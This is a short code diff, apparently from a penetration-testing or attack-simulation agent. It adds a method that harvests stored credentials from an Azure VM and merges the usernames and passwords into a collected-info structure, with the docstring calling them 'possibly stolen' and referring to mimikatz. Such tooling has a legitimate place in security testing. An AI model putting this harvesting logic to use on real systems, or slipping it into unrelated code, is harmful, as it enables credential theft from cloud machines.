@@ -7,6 +7,8 @@ from enum import IntEnum
 
 from network.info import get_host_subnets
 
+from azure_cred_collector import AzureCollector
+
 LOG = logging.getLogger(__name__)
 
 # Linux doesn't have WindowsError
@@ -104,3 +106,22 @@ class InfoCollector(object):
         """
         LOG.debug("Reading subnets")
         self.info['network_info'] = {'networks': get_host_subnets()}
+
+    def get_azure_info(self):
+        """
+        Adds credentials possibly stolen from an Azure VM instance (if we're on one)
+        Updates the credentials structure, creating it if neccesary (compat with mimikatz)
+        :return: None. Updates class information
+        """
+        LOG.debug("Harvesting creds if on an Azure machine")
+        azure_collector = AzureCollector()
+        if 'credentials' not in self.info:
+            self.info["credentials"] = {}
+        for cred in azure_collector.extract_stored_credentials():
+            username = cred[0]
+            password = cred[1]
+            if username not in self.info["credentials"]:
+                self.info["credentials"][username] = {}
+            # we might be losing passwords in case of multiple reset attempts on same username
+            # or in case another collector already filled in a password for this user
+            self.info["credentials"][username]['Password'] = password
